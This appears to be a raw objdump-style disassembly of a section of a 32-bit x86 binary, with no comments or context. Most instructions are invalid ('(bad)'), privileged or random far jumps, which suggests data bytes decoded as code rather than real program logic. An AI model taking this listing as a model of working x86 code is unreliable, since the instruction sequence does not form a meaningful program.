  428e70:	call   0xdc246171
  428e75:	fnstsw WORD PTR [ebp-0x262f04]
  428e7b:	fisttp DWORD PTR [edx]
  428e7d:	in     eax,0xc1
  428e7f:	pop    es
  428e80:	into   
  428e81:	out    dx,eax
  428e82:	(bad)  
  428e83:	call   0xec213749
  428e88:	aam    0xc3
  428e8a:	loope  0x428e66
  428e8c:	jmp    0xbfb8:0xd2ecb1f8
  428e93:	add    bh,BYTE PTR [ecx-0x2c2cff46]
  428e99:	mov    esi,0xeadc02e0
  428e9e:	dec    ebx
  428ea0:	loop   0x428e68
  428ea2:	adc    ebp,esi
  428ea4:	in     eax,dx
  428ea5:	shl    dh,cl
  428ea7:	in     al,dx
  428ea8:	mov    esp,0xafbbd1d7
  428ead:	lock sar dh,1
  428eb0:	lock into 
  428eb2:	clc    
  428eb3:	add    edi,DWORD PTR [ecx-0x33082840]
  428eb9:	cmc    
  428eba:	loop   0x428ec7
  428ebc:	(bad)  
  428ebd:	fisttp WORD PTR [edi]
  428ebf:	(bad)  
  428ec1:	loop   0x428ecf
  428ec3:	retf   
  428ec4:	mov    cl,0xe9
  428ec6:	(bad)  
  428ec8:	jmp    0xdbd5:0xf6d3ede7
  428ecf:	mov    dh,0xbb
  428ed1:	fdiv   st(7),st
  428ed3:	(bad)  
  428ed5:	std    
  428ed6:	cmc    
  428ed7:	fdivp  st(6),st
  428ed9:	aam    0xdd
  428edb:	or     cl,BYTE PTR [ebx]
  428edd:	(bad)
  428ee0:	out    0xc,eax
  428ee2:	(bad)  
  428ee4:	loope  0x428ed5
  428ee6:	mov    ebp,0xb7eccbbe
  428eeb:	test   dh,0xec
  428eee:	clc    
  428eef:	int    0xbd
  428ef1:	sar    BYTE PTR [esi-0x380e2a07],1
  428ef7:	add    ah,ch
  428ef9:	or     ebx,ecx
  428efb:	fcomp  st(2)
  428efd:	or     ah,bh
  428eff:	mov    esp,0xe6e5d4dc
  428f04:	fdiv   QWORD PTR [ebx-0x4c182e42]
  428f0a:	mov    cl,0xeb
  428f0c:	fcmove st,st(3)
  428f0e:	cmc    
  428f0f:	sti    
  428f10:	idiv   eax
  428f12:	mov    ecx,0x1bdfdde
  428f17:	out    0x4,al
  428f19:	(bad)  
  428f1b:	aad    0xc7
  428f1d:	xlat   BYTE PTR ds:[ebx]
  428f1e:	psrad  mm0,QWORD PTR [edi]
  428f21:	or     eax,0xcfc6f8ed
  428f26:	fsub   st(7),st
  428f28:	fstp   st(3)
  428f2a:	repz jmp 0xf6fa:0xbbcee0e9
  428f32:	aam    0xd8
  428f34:	add    al,cl
  428f36:	int3   
  428f37:	fdivp  st(3),st
  428f39:	std    
  428f3a:	(bad)  
  428f3c:	not    edi
  428f3e:	in     eax,0xef
  428f40:	or     ah,bh
  428f42:	pop    es
  428f43:	rol    dh,cl
  428f45:	test   eax,0xe5e4e7d1
  428f4a:	lods   al,BYTE PTR ds:[esi]
  428f4b:	aam    0xc4
  428f4d:	mov    ah,0xc6
  428f4f:	repnz in al,dx
  428f51:	aam    0xd3
  428f53:	ret    
  428f54:	std    
  428f55:	jecxz  0x428f2a
  428f57:	(bad)  
  428f58:	out    0xba,eax
  428f5a:	dec    ebx
  428f5c:	imul   bh
  428f5e:	or     cl,dh
  428f60:	add    dl,cl
  428f62:	cli    
  428f63:	clc    
  428f64:	ret    0xe6ad
  428f67:	fsubr  QWORD PTR [ebp-0x35375331]
  428f6d:	mov    ebx,0xc4b3d3ce
  428f72:	(bad)  
  428f73:	jecxz  0x428f4f
  428f75:	sar    DWORD PTR [ecx-0x3a0ef919],cl
  428f7b:	loop   0x428f7d
  428f7d:	add    esp,ebx
  428f7f:	in     eax,0xc6
  428f81:	(bad)  
  428f82:	dec    bl
  428f84:	mov    ebp,0xc1c8acc5
  428f89:	ret    0xf3b4
  428f8c:	rol    ch,cl
  428f8e:	lock cli 
  428f90:	(bad)  
  428f92:	mov    ecx,0xffd1fdfb
  428f97:	rol    DWORD PTR [edx],1
  428f99:	fmul   DWORD PTR [edx]
  428f9b:	add    al,0xe4
  428f9d:	add    al,0xda
  428f9f:	fcmove st,st(3)
  428fa1:	fcmovu st,st(1)
  428fa3:	fistp  QWORD PTR [edi-0xd2f533d]
  428fa9:	jecxz  0x428f86
  428fab:	mov    cl,0xb5
  428fad:	mov    cl,0xda
  428faf:	mov    bh,0xba
  428fb1:	mov    edi,0xc3d2d603
  428fb6:	add    ebp,ecx
  428fb8:	inc    BYTE PTR [ebx]
  428fba:	(bad)  
  428fbc:	leave  
  428fbd:	add    eax,0xe9e6fefa
  428fc2:	loop   0x428fcf
  428fc4:	vpsrlq xmm5,xmm5,xmm0
  428fc8:	mov    ch,0xaa
  428fca:	repz repz int 0xb9
  428fce:	in     al,0xc4
  428fd0:	int    0xf1
  428fd2:	int    0xfe
  428fd4:	icebp  
  428fd5:	hlt    
  428fd6:	fild   DWORD PTR [edx]
  428fd8:	fdivp  st(4),st
  428fda:	sar    bl,1
  428fdc:	std    
  428fdd:	push   edi
  428fdf:	add    cl,dh
  428fe1:	iret   
  428fe2:	in     al,0x7
  428fe4:	fucomp st(0)
  428fe6:	ror    edx,1
  428fe8:	in     al,0xf0
  428fea:	mov    al,0xb4
  428fec:	repnz (bad) 
  428fee:	cmc    
  428fef:	in     al,dx
  428ff0:	fcomp  st(5)
  428ff2:	stc    
  428ff3:	rcl    edi,1
  428ff5:	shl    DWORD PTR [ebp-0xd0a002a],1
  428ffb:	or     al,ch
  428ffd:	loopne 0x428fea
  428fff:	(bad)  
  429000:	add    eax,0xea00c1e4
  429005:	in     eax,dx
  429006:	mov    esp,0xd4c5abb6
  42900b:	stc    
  42900c:	shl    ah,cl
  42900e:	mov    eax,0xb4b2ccf5
  429013:	imul   al
  429015:	into   
  429016:	rcl    bh,1
  429018:	xlat   BYTE PTR ds:[ebx]
  429019:	add    bh,dh
  42901b:	vpsubw xmm2,xmm6,xmm6
  42901f:	out    0xdc,eax
  429021:	(bad)  
  429023:	add    dl,ah
  429025:	(bad)  
  429026:	out    dx,al
  429027:	jmp    0xb618580f
  42902c:	out    dx,eax
  42902d:	call   0xd1016327
  429032:	fdivr  st,st(6)
  429034:	out    dx,al
  429035:	add    bl,bl
  429037:	(bad)  
  429038:	stc    
  429039:	push   es
  42903a:	pop    es
  42903b:	icebp  
  42903c:	jecxz  0x42902e
  42903e:	fcomi  st,st(5)
  429040:	cld    
  429041:	(bad)
  429044:	in     al,dx
  429045:	fcomip st,st(3)
  429047:	mov    al,0xcb
  429049:	jmp    0xea337b10
  42904e:	shl    ah,1
  429050:	stc    
  429051:	in     al,0xd3
  429053:	inc    dl
  429055:	mov    esi,0xd1c5cefa
  42905a:	sar    ebx,cl
  42905c:	les    ecx,FWORD PTR [edx]
  42905e:	shl    edx,0x6
  429061:	in     al,dx
  429062:	jmp    0x429064
  429064:	ror    ah,0xbf
  429067:	iret   
  429068:	mov    esp,0xdbcbc6ec
  42906d:	(bad)
  429070:	int3   
  429071:	hlt    
  429072:	aad    0xd7
  429074:	mov    esp,0x3fbb9b8
  429079:	sti    
  42907a:	mul    esi
  42907c:	fcmovnu st,st(5)
  42907e:	out    dx,eax
  42907f:	jecxz  0x429081
  429081:	fucomp st(7)
  429083:	push   es
  429084:	mov    ebp,0xd3edf2ea
  429089:	retf   
  42908a:	shl    ah,cl
  42908c:	mov    bh,0xec
  42908e:	mov    esp,0xf2d9d9bf
  429094:	rcr    ebx,cl
  429096:	(bad)  
  429098:	rol    DWORD PTR [ecx],1
  42909a:	loopne 0x42909a
  42909c:	fsubr  st(7),st
  42909e:	(bad)  
  42909f:	(bad)  
  4290a0:	jecxz  0x429067
  4290a2:	shr    eax,cl
  4290a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4290a5:	(bad)
  4290a8:	(bad)  
  4290a9:	icebp  
  4290aa:	mov    ch,0xc0
  4290ac:	cli    
  4290ad:	in     eax,0xcb
  4290af:	mov    edi,0x3bccae9
  4290b4:	stc    
  4290b5:	clc    
  4290b6:	stc    
  4290b7:	out    0x1,eax
  4290b9:	rol    dh,cl
  4290bb:	jmp    0xe6cd:0xedeac805
  4290c2:	psubb  mm4,mm5
  4290c5:	(bad)
  4290c8:	cmc    
  4290c9:	in     al,dx
  4290ca:	iret   
  4290cb:	lods   al,BYTE PTR ds:[esi]
  4290cc:	(bad)  
  4290cd:	repnz rcr ch,cl
  4290d0:	fstp   TBYTE PTR [esi-0x3007fd02]
  4290d6:	out    dx,al
  4290d7:	fidivr DWORD PTR [ebx-0x2a152221]
  4290dd:	jmp    0xcffa:0xdfed90e
  4290e4:	shl    bl,cl
  4290e6:	call   0xfc0b51ab
  4290eb:	(bad)  
  4290ec:	loope  0x4290a0
  4290ee:	(bad)  
  4290f0:	div    eax
  4290f2:	mov    ebp,0xd8bed5de
  4290f7:	fdiv   st(7),st
  4290f9:	or     ebx,esi
  4290fb:	cli    
  4290fc:	(bad)  
  4290fd:	sti    
  4290fe:	hlt    
  4290ff:	jmp    0x4290c9
  429101:	add    ah,dl
  429103:	in     al,dx
  429104:	stos   DWORD PTR es:[edi],eax
  429105:	repz loop 0x4290e6
  429108:	mov    cl,0xd0
  42910a:	leave  
  42910b:	hlt    
  42910c:	(bad)
  42910f:	push   DWORD PTR [eax+edi*8-0x13061124]
  429116:	mul    bh
  429118:	in     al,0x3
  42911a:	aam    0xd6
  42911c:	neg    esi
  42911e:	call   esi
  429120:	in     eax,dx
  429121:	stc    
  429122:	fucomip st,st(3)
  429124:	jmp    0x4290de
  429126:	mov    ebp,0xd5e3d2f3
  42912b:	fprem1 
  42912d:	loopne 0x4290fa
  42912f:	repz test bl,0xe2
  429133:	aam    0xdd
  429135:	add    esi,esi
  429137:	int    0xd4
  429139:	rol    DWORD PTR [eax],0xfa
  42913c:	add    ecx,edi
  42913e:	out    0xe6,al
  429140:	iret   
  429141:	vpsrld ymm2,ymm2,xmm1
  429145:	mov    dl,0xc4
  429147:	jmp    0xcdf65601
  42914c:	(bad)  
  42914d:	jmp    0xcc1f5702
  429152:	cmc    
  429153:	ret    
  429154:	fstp   st(7)
  429156:	loope  0x42911b
  429158:	add    al,0xe1
  42915a:	hlt    
  42915b:	mov    esp,0xc6c9f9ca
  429160:	std    
  429161:	in     al,dx
  429162:	loope  0x42912e
  429164:	fldcw  WORD PTR [esi-0x4a3a1222]
  42916a:	retf   0xeeb2
  42916d:	(bad)  
  42916e:	clc    
  42916f:	fnstcw WORD PTR [eax-0x2c1c4406]
  429175:	mov    ebp,0x2f9bef4
  42917a:	in     eax,0xc3
  42917c:	retf   
  42917d:	mov    esi,0xc20bf6de
  429182:	jmp    0xafdd:0xc1cfd1de
  429189:	mov    esp,0xcfc0baa9
  42918e:	fcmovnbe st,st(0)
  429190:	fst    st(2)
  429192:	into   
  429193:	mov    ecx,0xd6e1e3f7
  429198:	in     al,dx
  429199:	(bad)  
  42919a:	fadd   st(0),st
  42919c:	in     al,0xe9
  42919e:	fsub   st(0),st
  4291a0:	or     eax,DWORD PTR [edi]
  4291a2:	in     eax,dx
  4291a3:	or     ebp,ecx
  4291a5:	mov    edi,0xe9ddb6cc
  4291aa:	iret   
  4291ab:	enter  0xfbc6,0xea
  4291af:	leave  
  4291b0:	(bad)  
  4291b2:	int3   
  4291b3:	aam    0xd0
  4291b5:	in     eax,dx
  4291b6:	mov    ecx,0x401f7fa
  4291bb:	fdiv   st(4),st
  4291bd:	ffreep st(1)
  4291bf:	(bad)  
  4291c0:	jmp    esi
  4291c2:	or     al,0xed
  4291c4:	(bad)  
  4291c6:	ror    ebp,1
  4291c8:	(bad)  
  4291c9:	iret   
  4291ca:	repz leave 
  4291cc:	mov    bh,0xeb
  4291ce:	repz clc 
  4291d0:	cli    
  4291d1:	aam    0xf8
  4291d3:	mov    ecx,0xfcdaf5c3
  4291d8:	out    0xcc,eax
  4291da:	lock std 
  4291dc:	in     al,0xea
  4291de:	dec    DWORD PTR [edi]
  4291e0:	fld    QWORD PTR [esi]
  4291e2:	cld    
  4291e3:	(bad)  
  4291e4:	mov    esp,0xc0cfd2df
  4291e9:	xlat   BYTE PTR ds:[ebx]
  4291ea:	repz loope 0x4291e8
  4291ed:	out    dx,al
  4291ee:	out    dx,eax
  4291ef:	retf   
  4291f0:	leave  
  4291f1:	aad    0xcf
  4291f3:	mov    ebp,0xe5dcbfc3
  4291f8:	cmc    
  4291f9:	rol    DWORD PTR ds:0xfbdad5da,1
  4291ff:	out    dx,eax
  429200:	push   es
  429201:	ret    0xe001
  429204:	repnz enter 0xdeed,0xc7
  429209:	call   0x1389b7
  42920e:	xlat   BYTE PTR ds:[ebx]
  42920f:	(bad)  
  429210:	xlat   BYTE PTR ds:[ebx]
  429211:	test   bl,0xc2
  429214:	fcmove st,st(7)
  429216:	mov    eax,0xf2c6dede
  42921b:	hlt    
  42921c:	loopne 0x4291fb
  42921e:	clc    
  42921f:	jmp    0xe9e7:0xe1e707cb
  429226:	shl    cl,cl
  429228:	ret    
  429229:	cmc    
  42922a:	xlat   BYTE PTR ds:[ebx]
  42922b:	sti    
  42922c:	iret   
  42922d:	in     eax,0xbb
  42922f:	test   cl,0xda
  429232:	rcl    al,cl
  429234:	fld    st(3)
  429236:	ret    0xe3ce
  429239:	mov    BYTE PTR [edi],0xf6
  42923c:	jmp    0x429213
  42923e:	aad    0xd8
  429240:	into   
  429241:	or     eax,0xeecfe7fa
  429246:	leave  
  429247:	ret    
  429248:	into   
  429249:	retf   0xf6b6
  42924c:	out    dx,eax
  42924d:	mov    eax,0xfecbffeb
  429252:	loop   0x42923d
  429254:	int3   
  429255:	mov    dh,0xd5
  429257:	fsub   st(4),st
  429259:	(bad)  
  42925a:	test   ch,0xe2
  42925d:	loop   0x429261
  42925f:	or     ch,cl
  429261:	out    0x5,eax
  429263:	call   0xae297949
  429268:	repnz jecxz 0x429221
  42926b:	in     eax,dx
  42926c:	not    dh
  42926e:	out    0xb9,eax
  429270:	mov    edi,0xdef9e8eb
  429275:	mov    edx,0xf2f801e3
  42927a:	std    
  42927b:	ror    BYTE PTR [edx],0xe5
  42927e:	add    eax,0xde0aceff
  429283:	loopne 0x429265
  429285:	out    dx,al
  429286:	shr    ebp,0xd3
  429289:	icebp  
  42928a:	loopne 0x429259
  42928c:	out    0xd9,eax
  42928e:	cli    
  42928f:	hlt    
  429290:	ror    ebx,cl
  429292:	call   0xe1458366
  429297:	in     eax,0xc0
  429299:	(bad)  
  42929a:	cld    
  42929b:	add    esp,edx
  42929d:	std    
  42929e:	hlt    
  42929f:	ud2    
  4292a1:	jecxz  0x42926e
  4292a3:	out    0xee,eax
  4292a5:	shl    ebx,cl
  4292a7:	(bad)  
  4292a8:	repnz leave 
  4292aa:	retf   0xebed
  4292ad:	leave  
  4292ae:	in     al,dx
  4292af:	enter  0xd3ef,0xbb
  4292b3:	out    dx,eax
  4292b4:	test   bl,0xed
  4292b7:	add    eax,DWORD PTR [ebx]
  4292b9:	mov    edx,0xd70be1fb
  4292be:	loope  0x4292cd
  4292c0:	jecxz  0x4292ca
  4292c2:	bswap  ebx
  4292c4:	icebp  
  4292c5:	iret   
  4292c6:	fidiv  WORD PTR [ebx-0x3a1f2e3f]
  4292cc:	into   
  4292cd:	int3   
  4292ce:	dec    ch
  4292d0:	out    dx,al
  4292d1:	mov    ch,0xcd
  4292d3:	into   
  4292d4:	mov    edi,0xe5cce6f9
  4292d9:	in     al,0xd2
  4292db:	(bad)  
  4292dc:	lock push es
  4292de:	shr    ebx,0x6
  4292e1:	into   
  4292e2:	jmp    0xcaeb3cd5
  4292e7:	lock mov al,0xe9
  4292ea:	leave  
  4292eb:	in     eax,0xd5
  4292ed:	loopne 0x4292c7
  4292ef:	repz mov edx,0xddb0bfd3
  4292f5:	int    0xfe
  4292f7:	mov    esp,0xf5e4fcd6
  4292fc:	std    
  4292fd:	out    dx,eax
  4292fe:	loope  0x4292ee
  429300:	(bad)  
  429301:	or     dl,BYTE PTR [ebx]
  429303:	shr    ah,0xc3
  429306:	jmp    0xe6e5:0xebc7e9b2
  42930d:	loopne 0x429300
  42930f:	fucomi st,st(2)
  429311:	fcmovnu st,st(7)
  429313:	(bad)  
  429315:	jecxz  0x429304
  429317:	icebp  
  429318:	fstp   st(6)
  42931a:	fcmovnb st,st(7)
  42931c:	loopne 0x429315
  42931e:	loopne 0x42931e
  429320:	jmp    0xe2468c0e
  429325:	retf   0xf6ca
  429328:	mov    cl,0xc1
  42932a:	rcl    ebp,0xf1
  42932d:	retf   0xeebf
  429330:	in     eax,dx
  429331:	add    ebx,ebp
  429333:	mov    ebp,0xb802d3f2
  429338:	loop   0x4292ff
  42933a:	add    esi,eax
  42933c:	rcl    ch,0xfb
  42933f:	(bad)  
  429340:	out    dx,al
  429341:	fsubrp st(3),st
  429343:	add    ebp,DWORD PTR [edi+ebx*8-0x4c0d1c43]
  42934a:	out    0xc7,eax
  42934c:	out    dx,eax
  42934d:	mov    dl,0xd9
  42934f:	retf   
  429350:	sar    DWORD PTR [ecx+0xf0f4c9],cl
  429356:	mov    eax,0x2c2c4d1
  42935c:	aad    0xe3
  42935e:	add    esi,esp
  429360:	ret    
  429361:	add    al,0xda
  429363:	into   
  429364:	in     al,0xf3
  429366:	lods   eax,DWORD PTR ds:[esi]
  429367:	mov    bl,0xe9
  429369:	jecxz  0x429362
  42936b:	rcl    ah,cl
  42936d:	aam    0xc9
  42936f:	mov    esi,0xf8d8b8f2
  429374:	ret    0xd8d0
  429377:	in     al,dx
  429378:	fadd   st,st(5)
  42937a:	std    
  42937b:	(bad)  
  42937c:	call   0xe01f9f77
  429381:	jmp    0x42936d
  429383:	jmp    0x429341
  429385:	test   al,0xeb
  429387:	mov    dl,0xb1
  429389:	leave  
  42938a:	mov    dh,0xef
  42938c:	mov    dh,0xd7
  42938e:	iret   
  42938f:	mov    edx,0xb8eafbcc
  429394:	(bad)  
  429396:	mov    edi,0xf1fbbef0
  42939b:	add    al,0x4
  42939d:	loopne 0x429375
  42939f:	add    cl,dl
  4293a1:	dec    cl
  4293a3:	jmp    0xc8f0:0xbce4f1c0
  4293aa:	repnz cli 
  4293ac:	(bad)  
  4293ad:	mov    dl,0xe4
  4293af:	int    0xdb
  4293b1:	xlat   BYTE PTR ds:[ebx]
  4293b2:	cmc    
  4293b3:	std    
  4293b4:	std    
  4293b5:	icebp  
  4293b6:	push   es
  4293b7:	(bad)  
  4293b8:	hlt    
  4293b9:	lds    eax,FWORD PTR [eax]
  4293bb:	mov    esp,0xefbde5fa
  4293c0:	clc    
  4293c1:	or     bh,bh
  4293c3:	cli    
  4293c4:	stos   BYTE PTR es:[edi],al
  4293c5:	xlat   BYTE PTR ds:[ebx]
  4293c6:	mul    esi
  4293c8:	in     eax,0xe1
  4293ca:	in     eax,dx
  4293cb:	aad    0xd5
  4293cd:	in     al,0xc6
  4293cf:	repnz mov ah,0xc4
  4293d2:	xlat   BYTE PTR ds:[ebx]
  4293d3:	cli    
  4293d4:	mov    esi,0xfbda0300
  4293d9:	loope  0x4293bb
  4293db:	(bad)  
  4293dc:	(bad)  
  4293de:	jmp    0xfb2c6cbf
  4293e3:	adc    ch,bl
  4293e5:	out    0xf2,al
  4293e7:	int    0xac
  4293e9:	loope  0x4293d1
  4293eb:	icebp  
  4293ec:	jmp    0xfa0b61dd
  4293f1:	xlat   BYTE PTR ds:[ebx]
  4293f2:	sti    
  4293f3:	int    0xe8
  4293f5:	(bad)  
  4293f7:	add    cl,ah
  4293f9:	hlt    
  4293fa:	mov    esp,0xe3c5d5da
  4293ff:	pop    es
  429400:	call   0xc23179f3
  429405:	jmp    0xdcff6c01
  42940a:	enter  0xc5bb,0xe6
  42940e:	aad    0xea
  429410:	mov    edi,0xf5f8cdd5
  429415:	xlat   BYTE PTR ds:[ebx]
  429416:	cmc    
  429417:	add    eax,ecx
  429419:	cli    
  42941a:	ret    
  42941b:	rol    BYTE PTR [esi+ebx*8],cl
  42941e:	xlat   BYTE PTR ds:[ebx]
  42941f:	retf   
  429420:	add    eax,0xe411c9c9
  429425:	mov    bl,0xf7
  429427:	imul   BYTE PTR [ebx-0xb334a12]
  42942d:	cli    
  42942e:	out    dx,eax
  42942f:	leave  
  429430:	fdivr  st(7),st
  429432:	sti    
  429433:	cmc    
  429434:	fadd   st(3),st
  429436:	iret   
  429437:	ret    
  429438:	out    0xf5,eax
  42943a:	(bad)  
  42943b:	(bad)  
  42943c:	xlat   BYTE PTR ds:[ebx]
  42943d:	neg    eax
  42943f:	aad    0xd8
  429441:	add    eax,0xeade05ce
  429446:	(bad)  
  429448:	out    0xe8,al
  42944a:	out    dx,eax
  42944b:	aam    0xb1
  42944d:	retf   
  42944e:	out    dx,eax
  42944f:	cli    
  429450:	lock mov dl,0xf0
  429453:	int    0xfe
  429455:	in     al,dx
  429456:	rcr    dl,1
  429458:	(bad)  
  429459:	out    0xfe,al
  42945b:	retf   0x2e6
  42945e:	mov    ebp,0x9e6fed6
  429463:	add    eax,0xc8f2e4b2
  429468:	into   
  429469:	int    0xca
  42946b:	retf   0xfad4
  42946e:	in     eax,dx
  42946f:	aad    0xce
  429471:	sar    DWORD PTR [eax+0x6d2ddf5],1
  429477:	bnd ret 
  429479:	loope  0x429479
  42947b:	(bad)  
  42947d:	imul   ecx
  42947f:	verr   di
  429482:	ror    edx,cl
  429484:	out    dx,al
  429485:	lods   eax,DWORD PTR ds:[esi]
  429486:	jmp    0x429456
  429488:	rol    edx,cl
  42948a:	cli    
  42948b:	lock out dx,al
  42948d:	(bad)  
  42948e:	lods   eax,DWORD PTR ds:[esi]
  42948f:	fptan  
  429491:	jmp    0xbde1:0xd2f6cad5
  429498:	fdiv   st(3),st
  42949a:	or     edi,edi
  42949c:	add    al,0x8
  42949e:	sti    
  42949f:	cmc    
  4294a0:	(bad)  
  4294a1:	or     al,0xc5
  4294a3:	jmp    0x429486
  4294a5:	retf   0xc4be
  4294a8:	in     al,0xc0
  4294aa:	in     al,dx
  4294ab:	(bad)  
  4294ac:	in     eax,0xf8
  4294ae:	stc    
  4294af:	retf   0xfbf2
  4294b2:	in     eax,dx
  4294b3:	stc    
  4294b4:	mov    esi,0xf7f3f5e8
  4294b9:	out    0x3,eax
  4294bb:	(bad)  
  4294bc:	test   BYTE PTR [edi*4-0x230cfc03],0xea
  4294c4:	jecxz  0x4294a7
  4294c6:	icebp  
  4294c7:	rcl    bl,cl
  4294c9:	leave  
  4294ca:	rcr    edx,1
  4294cc:	mov    ch,0xba
  4294ce:	cli    
  4294cf:	test   dh,0xf6
  4294d2:	fmulp  st(5),st
  4294d4:	mov    ecx,0xbd02f8c2
  4294d9:	add    ah,al
  4294db:	push   es
  4294dc:	add    DWORD PTR [ebx],ecx
  4294de:	loope  0x4294d9
  4294e0:	in     eax,0xc2
  4294e2:	or     bl,bh
  4294e4:	shr    ecx,1
  4294e6:	mov    bl,0xd5
  4294e8:	div    BYTE PTR [esi-0x37322609]
  4294ee:	fcmovnbe st,st(0)
  4294f0:	enter  0xbefd,0x3
  4294f4:	clc    
  4294f5:	rol    DWORD PTR [edx],1
  4294f7:	mov    ebp,0xd703f500
  4294fc:	(bad)  
  4294fd:	test   ch,0x8
  429500:	push   cs
  429501:	fadd   DWORD PTR [ebx]
  429503:	out    dx,eax
  429504:	shr    cl,0xe6
  429507:	loope  0x4294fb
  429509:	ret    
  42950a:	rcl    bl,0xf4
  42950d:	(bad)  
  42950e:	mov    eax,0xccebd9f3
  429513:	shl    edx,cl
  429515:	sti    
  429516:	shl    esi,1
  429518:	out    0x0,al
  42951a:	fprem1 
  42951c:	mov    edi,0x4e109d5
  429521:	add    ecx,DWORD PTR [eax]
  429523:	out    dx,al
  429524:	into   
  429525:	mov    al,0xb1
  429527:	shr    BYTE PTR [edi-0x281f192c],cl
  42952d:	enter  0xc8d1,0xf5
  429531:	mov    ch,0xfd
  429533:	enter  0xc2cc,0xf2
  429537:	out    dx,al
  429538:	ret    0xfbd2
  42953b:	sar    ah,0xdb
  42953e:	add    DWORD PTR [ecx],eax
  429540:	(bad)  
  429542:	repz retf 
  429544:	loope  0x42950f
  429546:	lods   al,BYTE PTR ds:[esi]
  429547:	loope  0x42951a
  429549:	mov    bh,0xb6
  42954b:	mov    bl,0xcf
  42954d:	loopne 0x429523
  42954f:	jmp    0x429528
  429551:	mov    edx,0xd7fcc8f5
  429556:	out    0xbd,eax
  429558:	idiv   BYTE PTR [edx-0x23f82bf9]
  42955e:	call   0xcd327e72
  429563:	adc    ebp,DWORD PTR [esi-0x1b1e3b22]
  429569:	mov    dl,0xe0
  42956b:	shl    esp,cl
  42956d:	lock fstp TBYTE PTR [edi-0x202a0507]
  429574:	add    bh,BYTE PTR [ebp-0x32b40fa]
  42957a:	sti    
  42957b:	in     al,0xe9
  42957d:	mov    BYTE PTR [edx],0xf4
  429580:	retf   0xde2
  429583:	fnstcw WORD PTR [edi+esi*8-0x173b1d12]
  42958a:	int    0xb1
  42958c:	out    0xf1,al
  42958e:	jmp    0x42954e
  429590:	fdiv   st(6),st
  429592:	jmp    0xee426563
  429597:	loope  0x429593
  429599:	aam    0xa
  42959b:	fdivp  st(6),st
  42959d:	fxch   st(0)
  42959f:	call   0xcf48848e
  4295a4:	repz test al,0xc9
  4295a7:	mov    al,0xc4
  4295a9:	fdiv   QWORD PTR [ebp-0x4e324a05]
  4295af:	out    0xd6,al
  4295b1:	mov    ah,0xbb
  4295b3:	aad    0xd8
  4295b5:	mov    ecx,0xbed3fccd
  4295ba:	pop    es
  4295bb:	add    bh,ah
  4295bd:	test   edx,0xc4fedfc8
  4295c3:	icebp  
  4295c4:	jmp    0x4295b7
  4295c6:	(bad)  
  4295c7:	retf   0xf2ea
  4295ca:	iret   
  4295cb:	(bad)  
  4295cc:	shr    esi,1
  4295ce:	mov    ah,0xed
  4295d0:	in     eax,dx
  4295d1:	mov    esp,0xc1f6d5ff
  4295d6:	pop    es
  4295d7:	mov    edx,0xacbe6dd
  4295dd:	or     edi,DWORD PTR [ebp-0x27012003]
  4295e3:	cld    
  4295e4:	mov    ecx,0xcaafc5dd
  4295e9:	in     al,dx
  4295ea:	lock shr ah,cl
  4295ed:	ffreep st(7)
  4295ef:	cmc    
  4295f0:	mov    ecx,0xf6e2fbd2
  4295f5:	aam    0xf1
  4295f7:	jecxz  0x4295f6
  4295f9:	loope  0x4295dc
  4295fb:	cmc    
  4295fc:	mov    edi,0xf80a05eb
  429601:	in     eax,0xfc
  429603:	adc    ch,BYTE PTR [ebp-0x38233d0f]
  429609:	loop   0x4295be
  42960b:	div    bl
  42960d:	clc    
  42960e:	cli    
  42960f:	mov    edi,0xeae9fbd9
  429614:	int    0xdf
  429616:	(bad)  
  429618:	loop   0x429613
  42961a:	test   ebx,0xdbe407dc
  429620:	cli    
  429621:	retf   
  429622:	add    edx,DWORD PTR [edx]
  429624:	ror    dl,0xac
  429627:	jmp    0xef2991f7
  42962c:	shl    al,cl
  42962e:	mov    ecx,0xf1e4feac
  429633:	loop   0x4295f4
  429635:	clc    
  429636:	stc    
  429637:	(bad)  
  429639:	(bad)  
  42963a:	(bad)  
  42963c:	retf   0xe9e3
  42963f:	(bad)
  429643:	fidivr WORD PTR [edx+edx*8-0x1b19290f]
  42964a:	in     eax,0xf4
  42964c:	mov    bh,0xb0
  42964e:	aam    0xef
  429650:	(bad)  
  429652:	jmp    0xf1c0:0xe0d2d8f8
  429659:	(bad)  
  42965a:	fisttp WORD PTR [ebx]
  42965c:	hlt    
  42965d:	or     al,BYTE PTR [esi]
  42965f:	loopne 0x42966d
  429661:	out    0xca,al
  429663:	fsub   st,st(3)
  429665:	jmp    0x429650
  429667:	rcl    edx,1
  429669:	jmp    0xf7d9:0xb7d1f2c9
  429670:	(bad)  
  429672:	fdivr  st(5),st
  429674:	add    eax,edx
  429676:	out    dx,al
  429677:	repnz rcr eax,1
  42967a:	jmp    0xc30a:0xefe1dcfc
  429681:	jmp    0xbd1f9665
  429686:	mov    ebp,0xf7aaafc5
  42968b:	mov    al,0xf7
  42968d:	jmp    0xc3f2:0xd6bab8e5
  429694:	in     al,dx
  429695:	mov    dh,0xc3
  429697:	add    eax,0xf8d50bcc
  42969c:	retf   
  42969d:	cli    
  42969e:	lds    ecx,FWORD PTR [ebx]
  4296a0:	in     al,0xf8
  4296a2:	enter  0xe80e,0xdd
  4296a6:	in     eax,dx
  4296a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4296a8:	int3   
  4296a9:	icebp  
  4296aa:	fcmove st,st(7)
  4296ac:	out    0xd4,eax
  4296ae:	aad    0xeb
  4296b0:	call   0xf0416d8d
  4296b5:	add    ebx,eax
  4296b7:	int    0xd7
  4296b9:	(bad)  
  4296ba:	sti    
  4296bb:	jmp    esp
  4296bd:	add    eax,0xddc6c7fd
  4296c2:	(bad)  
  4296c3:	icebp  
  4296c4:	out    dx,eax
  4296c5:	mov    ebp,0xd6b3d0bc
  4296ca:	in     al,dx
  4296cb:	mov    al,0xbb
  4296cd:	in     eax,0xda
  4296cf:	(bad)  
  4296d0:	in     al,dx
  4296d1:	cli    
  4296d2:	std    
  4296d3:	retf   0xeebe
  4296d6:	cmc    
  4296d7:	ret    
  4296d8:	(bad)  
  4296da:	fucompp 
  4296dc:	aad    0xd4
  4296de:	in     eax,0xdc
  4296e0:	fist   DWORD PTR [ebx]
  4296e2:	jmp    0xb4236fd6
  4296e7:	aad    0xd2
  4296e9:	jmp    0xe4ba:0xf2afebea
  4296f0:	int3   
  4296f1:	jecxz  0x4296cb
  4296f3:	mov    esi,0xbef0cdd2
  4296f8:	clc    
  4296f9:	xlat   BYTE PTR ds:[ebx]
  4296fa:	rol    BYTE PTR [eax],1
  4296fc:	add    edx,ebp
